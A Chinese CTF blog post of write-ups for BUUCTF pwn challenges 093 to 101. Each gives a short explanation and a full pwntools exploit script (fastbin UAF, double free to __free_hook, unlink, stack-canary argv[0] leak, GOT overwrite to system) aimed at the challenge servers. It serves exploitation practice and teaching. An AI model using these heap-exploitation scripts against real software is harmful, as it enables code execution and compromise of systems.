---
title: buuctf-pwn write-ups (12)
date: 2023-03-06 20:49:16
categories:
- write-ups
- buuctf 系列
---
# buu093-wustctf2020_easyfast
Ubuntu 16.04下的简单堆题，使用fastbin直接UAF，分配到关键位置，注意前面有一个0x50表示chunk的大小，如果这个值不存在，那么这里是无法分配chunk的。
```python
from pwn import *
context.log_level = 'debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 28773)
elf = ELF('./pwn')

sla = lambda x, y: io.sendlineafter(x, y)

def add(size):
	sla(b'choice>\n', b'1')
	sla(b'size>\n', str(size).encode())

def delete(index):
	sla(b'choice>\n', b'2')
	sla(b'index>\n', str(index).encode())

def writein(index, content):
	sla(b'choice>\n', b'3')
	sla(b'index>\n', str(index).encode())
	time.sleep(0.1)
	io.send(content)

add(0x40)
delete(0)
writein(0, p64(0x602080))
add(0x40)
add(0x40)
writein(2, p64(0))
sla(b'choice>\n', b'4')
io.interactive()
```

# buu094-ciscn_2019_es_1
这道题虽然说的是“hate libc 2.29”，但实际上最后发现用的还是glibc 2.27-3ubuntu1版本，也就是能够double free的版本。本题想要获取libc地址很简单，因为free之后地址还在，只要add一个大于0x400的chunk，释放后再show一下即可获取。然后double free一个小chunk，以将chunk分配到__free_hook。

```python
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'

# io = process('./ciscn_2019_es_1')
io = remote('node4.buuoj.cn', 28589)

sla = lambda x, y: io.sendlineafter(x, y)

def add(size, name, phone):
	sla(b'choice:', b'1')
	sla(b'Please input the size of compary\'s name\n', str(size).encode())
	sla(b'please input name:\n', name)
	sla(b'please input compary call:\n', phone)

def delete(idx):
	sla(b'choice:', b'3')
	sla(b'Please input the index:\n', str(idx).encode())
	
def show(idx):
	sla(b'choice:', b'2')
	sla(b'Please input the index:\n', str(idx).encode())

add(0x440, b'a', b'a')
add(0x440, b'a', b'a')
add(0x50, b'/bin/sh\x00', b'a')
delete(0)
show(0)
io.recvuntil(b'name:\n')
main_arena = u64(io.recv(6) + b'\x00\x00') - 96
__malloc_hook = main_arena - 0x10
log.info('__malloc_hook: ' + hex(__malloc_hook))
libc = LibcSearcher('__malloc_hook', __malloc_hook)
base = __malloc_hook - libc.dump('__malloc_hook')
system = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')
log.info('libc base: ' + hex(base))
log.info('system: ' + hex(system))
__free_hook = base + libc.dump('__free_hook')

add(0x30, b'b', b'b')
add(0x30, b'b', b'b')
delete(3)
delete(3)

add(0x30, p64(__free_hook), b'b')
add(0x30, b'b', b'b')
add(0x30, p64(system), b'b')
delete(2)
io.interactive()
```

# buu095-wdb2018_guess
这道题的解法需要使用glibc 2.23下的`__stack_chk_fail`函数。在2.23中，`__stack_chk_fail`的函数定义如下：

```c
void
__attribute__ ((noreturn)) internal_function
__fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
		    msg, __libc_argv[0] ?: "<unknown>");
}
libc_hidden_def (__fortify_fail)
```

这是函数`__stack_chk_fail`直接调用的函数，可以看到这里会打印出`argv[0]`的内容，这个值在调试过程中会保存到r13寄存器的位置。且一般在栈的顶部位置。这个地址与我们通过gets写入字符串的地址的偏移是固定的，因此第一次我们可以通过将这个值修改为got表地址，来获取到libc的加载地址；第二次我们将其修改为`environ`变量的值，这个变量位于libc中，保存着栈地址；在获取了栈地址之后，第三次我们就可以将其修改为flag的内容，然后就可以输出了。

```python
from pwn import *
context.log_level = 'debug'

# io = process('./GUESS')
io = remote('node4.buuoj.cn', 28148)
elf = ELF('./GUESS')
libc = ELF('./libc.so.6')


io.sendlineafter(b'Please type your guessing flag\n', cyclic(0x128) + p64(elf.got['puts']))
io.recvuntil(b'*** stack smashing detected ***: ')
puts = u64(io.recv(6) + b'\x00\x00')
base = puts - libc.symbols['puts']
log.info('libc base: ' + hex(base))
environ = base + libc.symbols['environ']
log.info('environ: ' + hex(environ))

io.sendlineafter(b'Please type your guessing flag\n', cyclic(0x128) + p64(environ))
io.recvuntil(b'*** stack smashing detected ***: ')
stack_addr = u64(io.recv(6) + b'\x00\x00')
flag_addr = stack_addr - 0x168
log.info('stack address: ' + hex(stack_addr))

io.sendlineafter(b'Please type your guessing flag\n', cyclic(0x128) + p64(flag_addr))

io.interactive()
```

# buu096-gyctf_2020_some_thing_exceting
这道题做的时候大意了，做着做着给flag已经被读到内存这件事给忘了……

在flag已经读入内存的情况下，这道题是很简单的，就是一个基础的堆排布，让0x10的header分配到可以写的buffer里面，直接修改指针的值然后show就行了。

如果这道题没有flag在内存中，首先就应该通过上面的这种方法获取libc基址，然后使用fastbin attack，用一次double free分配到`__malloc_hook`，注意修改指针的值应该是`__malloc_hook - 0x23`，原因参见我的这篇文章：[传送门](https://hornos3.github.io/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-3/)

注意这里不能分配到`__free_hook`，因为fastbin分配之前会检查size字段，而`__free_hook`前面并不存在有效的size字段。然后将`__malloc_hook`改成one_gadget，可惜测试完发现4个one_gadget都不行，于是开始怀疑人生，然后突然就意识到flag在内存中本来就有……

下面的代码注释掉的部分就是不存在flag时的利用方式。

```python
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'

one_gadgets = [0x45216, 0x4526A, 0xF02A4, 0xF1147]

# io = process('./pwn')
io = remote('node4.buuoj.cn', 27127)
elf = ELF('./pwn')

sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)

def add(basize, nasize, bacon, nacon):
	sla(b'> Now please tell me what you want to do :', b'1')
	sla(b'> ba\'s length : ', str(basize).encode())
	sa(b'> ba : ', bacon)
	sla(b'> na\'s length : ', str(nasize).encode())
	sa(b'> na : ', nacon)
	
def delete(idx):
	sla(b'> Now please tell me what you want to do :', b'3')
	sla(b'> Banana ID : ', str(idx).encode())
	
def show(idx):
	sla(b'> Now please tell me what you want to do :', b'4')
	sla(b'> SCP project ID : ', str(idx).encode())
	
add(0x60, 0x60, b'a\n', b'a\n')		# 0
add(0x60, 0x60, b'a\n', b'a\n')		# 1
delete(0)
delete(1)
add(0x18, 0x18, p64(elf.got['puts']) + p64(0x6020A8), b'a')	# 2
show(0)

'''
io.recvuntil(b'Banana\'s ba is ')
puts = u64(io.recv(6) + b'\x00\x00')
log.info('puts: ' + hex(puts))
libc = LibcSearcher('puts', puts)
base = puts - libc.dump('puts')
system = base + libc.dump('system')
__malloc_hook = base + libc.dump('__malloc_hook')
'''

'''
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
base = puts - libc.symbols['puts']
system = base + libc.symbols['system']
__malloc_hook = base + libc.symbols['__malloc_hook']
'''

'''
io.recvuntil('Banana\'s na is ')
heap_addr = u64(io.recvuntil(b'\n', drop=True).ljust(8, b'\x00'))
log.info('system: ' + hex(system))
log.info('heap addr: ' + hex(heap_addr))

add(0x60, 0x60, b'a\n', b'a\n')		# 3
add(0x60, 0x60, b'a\n', b'a\n')		# 4
delete(3)
delete(4)
add(0x18, 0x18, p64(heap_addr + 0x10) + p64(heap_addr + 0x110), b'b')	# 5
add(0x60, 0x60, b'a\n', b'a\n')		# 6
delete(6)
delete(3)

add(0x60, 0x60, b'a\n', p64(__malloc_hook - 0x23))	# 7
add(0x60, 0x60, b'a\n', b'a\n')	# 8
add(0x60, 0x50, b'b' * 19 + p64(one_gadgets[3]), b'/bin/sh\n')	# 9
# add(0x18, 0x18, b'a\n', p64(system))
# delete(7)
# gdb.attach(io, 'b *0x400C24')
# time.sleep(3)

io.interactive()
'''
```

# buu097-axb_2019_heap
这题的漏洞在于输入的时候会溢出1个字节，因此自然就可以想到使用unlink的方法来做。但这道题有一个很坑的点就是不能用LibcSearcher，虽然它能给你查到2个libc，但是无论你用哪个，远程都打不通，报错，但是用buuoj提供的64位的2.23 glibc就行，这个点坑了我好几个小时才发现。
```python
from pwn import *
context.log_level = 'debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 29678)
elf = ELF('./pwn')
libc = ELF('./libc-2.23.so')

sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)

def add(index, size, content):
	sla(b'>> ', b'1')
	sla(b'Enter the index you want to create (0-10):', str(index).encode())
	sla(b'Enter a size:', str(size).encode())
	sla(b'Enter the content: ', content)

def delete(index):
	sla(b'>> ', b'2')
	sla(b'Enter an index:\n', str(index).encode())
	
def edit(index, content):
	sla(b'>> ', b'4')
	sla(b'Enter an index:\n', str(index).encode())
	sla(b'Enter the content: \n', content)

sla(b'Enter your name: ', b'%15$p%19$p')
io.recvuntil(b'0x')
__libc_start_main = int(io.recvuntil(b'0x', drop=True), 16) - 240
elf_addr = int(io.recvuntil(b'\n', drop=True), 16) - 0x116A
note_addr = elf_addr + 0x202060

log.info('__libc_start_main: ' + hex(__libc_start_main))
log.info('elf base: ' + hex(elf_addr))

libc_base = __libc_start_main - libc.symbols['__libc_start_main']
__free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']


add(0, 0x98, b'a')
add(1, 0xA0, b'/bin/sh')
edit(0, p64(0x10) + p64(0x91) + p64(note_addr - 0x18) + p64(note_addr - 0x10) + cyclic(0x70) + p64(0x90) + b'\xB0')
delete(1)
edit(0, p64(0) * 3 + p64(__free_hook) + p64(0x38) + p64(note_addr + 0x18) + b'/bin/sh\x00')
edit(0, p64(system))
delete(1)
# gdb.attach(io)
# time.sleep(3)

io.interactive()
```

# buu098-oneshot_tjctf_2016
第一次输出got表地址，然后获取libc地址，跳转到one_gadget即可。
```python
from pwn import *
context.log_level = 'debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 27336)
elf = ELF('./pwn')
libc = ELF('./libc-2.23.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)
ru = lambda x: io.recvuntil(x)
rud = lambda x: io.recvuntil(x, drop=True)

sla(b'Read location?\n', str(elf.got['puts']).encode())
ru(b'Value: 0x')
libc_base = int(rud(b'\n'), 16) - libc.symbols['puts']
sla(b'Jump location?\n', str(one_gadgets[3] + libc_base).encode())

io.interactive()
```

# buu099-护网杯_2018_gettingstart
```python
from pwn import *
context.log_level = 'debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 29278)
elf = ELF('./pwn')
libc = ELF('./libc-2.23.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)
ru = lambda x: io.recvuntil(x)
rud = lambda x: io.recvuntil(x, drop=True)

sla(b'But Whether it starts depends on you.\n', cyclic(0x18) + p64(0x7FFFFFFFFFFFFFFF) + p64(0x3FB999999999999A))
io.interactive()
```

# buu100-wustctf2020_number_game
计算机组成原理的知识……对于32位整数而言，只有0x80000000这个数（-2147483648）取相反数的值为2147483648，还是0x80000000，所以表示的数不变。输入这个数就行了。

# buu101-zctf2016_note2
这道题提供了4个选项：增加、删除、修改、查看。其中修改能够提供2种选项——追加和覆写。修改部分的代码如下：
```c
void __fastcall edit()
{
  char *v0; // rbx
  int v1; // [rsp+8h] [rbp-E8h]
  int v2; // [rsp+Ch] [rbp-E4h]
  char *src; // [rsp+10h] [rbp-E0h]
  __int64 size; // [rsp+18h] [rbp-D8h]
  char dest[128]; // [rsp+20h] [rbp-D0h] BYREF
  char *tempbuf; // [rsp+A0h] [rbp-50h]
  unsigned __int64 v7; // [rsp+D8h] [rbp-18h]

  v7 = __readfsqword(0x28u);
  if ( put_limit )
  {
    puts("Input the id of the note:");
    v1 = input_int();
    if ( v1 >= 0 && v1 <= 3 )
    {
      src = ptr[v1];
      size = sizes[v1];
      if ( src )
      {
        puts("do you want to overwrite or append?[1.overwrite/2.append]");
        v2 = input_int();
        if ( v2 == 1 || v2 == 2 )
        {
          if ( v2 == 1 )
            dest[0] = 0;
          else
            strcpy(dest, src);
          tempbuf = (char *)malloc(0xA0uLL);
          strcpy(tempbuf, "TheNewContents:");
          printf(tempbuf);
          input(tempbuf + 15, 0x90LL, '\n');
          parse(tempbuf + 15);
          v0 = tempbuf;
          v0[size - strlen(dest) + 14] = 0;
          strncat(dest, tempbuf + 15, 0xFFFFFFFFFFFFFFFFLL);
          strcpy(src, dest);
          free(tempbuf);
          puts("Edit note success!");
        }
        else
        {
          puts("Error choice!");
        }
      }
      else
      {
        puts("note has been deleted");
      }
    }
  }
  else
  {
    puts("Please add a note!");
  }
}
```
注意其中的`strncat`函数，其第3个参数是字符串拼接之后的最大长度，虽然这里传的是最大的无符号整数，但是并不意味着这里可以溢出，因为前面还有一个`v0[size - strlen(dest) + 14] = 0;`将要追加的内容截断了，因此漏洞点不在这里。

经过测试发现，在glibc 2.23版本中，`malloc(0)`会创建一个大小为0x20的chunk，此时我们的重点就放在了输入的函数中：
```c
unsigned __int64 __fastcall input(char *buffer, __int64 maxsize, char endchar)
{
  char buf; // [rsp+2Fh] [rbp-11h] BYREF
  unsigned __int64 i; // [rsp+30h] [rbp-10h]
  ssize_t v7; // [rsp+38h] [rbp-8h]

  for ( i = 0LL; maxsize - 1 > i; ++i )
  {
    v7 = read(0, &buf, 1uLL);
    if ( v7 <= 0 )
      exit(-1);
    if ( buf == endchar )
      break;
    buffer[i] = buf;
  }
  buffer[i] = 0;
  return i;
}
```

注意循环是`for ( i = 0LL; maxsize - 1 > i; ++i )`，查看汇编：
```asm
.text:0000000000400A28 loc_400A28:                             ; CODE XREF: input+1D↑j
.text:0000000000400A28                 mov     rax, [rbp+var_30]
.text:0000000000400A2C                 sub     rax, 1
.text:0000000000400A30                 cmp     rax, [rbp+var_10]
.text:0000000000400A34                 ja      short loc_4009DC
```

这里是ja指令，因此是无符号的比较，但如果传入的size为0的话，那么这里就相当于是溢出任意多个字节。

既然有这样一个漏洞，在2.23环境很容易想到unlink，毕竟本题elf没加PIE，我们知道堆地址是保存在什么地方的，因此unlink最方便。

我的做法是覆盖atoi的got表地址为system，然后在输出菜单之后直接输入`/bin/sh`即可。
```python
from pwn import *
context.log_level = 'debug'

# io = process('./pwn')
io = remote('node4.buuoj.cn', 28072)
elf = ELF('./pwn')
libc = ELF('./libc-2.23.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)
ru = lambda x: io.recvuntil(x)
rud = lambda x: io.recvuntil(x, drop=True)
ita = lambda: io.interactive()

def add(size, content):
	sla(b'option--->>', b'1')
	sla(b'Input the length of the note content:(less than 128)', str(size).encode())
	sa(b'Input the note content:', content)

def show(idx):
	sla(b'option--->>', b'2')
	sla(b'Input the id of the note:', str(idx).encode())

def edit(idx, option, content):
	sla(b'option--->>', b'3')
	sla(b'Input the id of the note:', str(idx).encode())
	sla(b'do you want to overwrite or append?[1.overwrite/2.append]', str(option).encode())
	sa(b'TheNewContents:', content)

def delete(idx):
	sla(b'option--->>', b'4')
	sla(b'Input the id of the note:', str(idx).encode())

sla(b'Input your name:', b'a')
sla(b'Input your address:', b'b')

bufptr = 0x602120

payload = p64(0x10) + p64(0x81)
payload += p64(bufptr + 8 - 0x18) + p64(bufptr + 8 - 0x10)

add(0x0, b'a\n')
add(0x80, b'a\n')
add(0x80, b'a\n')
delete(0)
add(0, b'a' * 0x18 + p64(0x91) + payload.ljust(0x80, b'a') + p64(0x80) + p64(0x90) + b'\n')
delete(2)

edit(1, 1, b'a' * 0x10 + p64(elf.got['atoi']) + p64(bufptr) + b'\n')
show(0)
ru(b'Content is ')
atoi = u64(io.recvuntil(b'\n', drop=True) + b'\x00\x00')
log.info("atoi = " + hex(atoi))
base = atoi - libc.symbols['atoi']
log.info("libc base = " + hex(base))
system = base + libc.symbols['system']
binsh = base + next(libc.search(b'/bin/sh'))
__free_hook = base + libc.symbols[b'__free_hook']

edit(1, 1, p64(elf.got['atoi']) + p64(bufptr) + b'\n')

edit(0, 1, p64(system) + b'\n')
sla(b'option--->>\n', b'/bin/sh')

ita()
```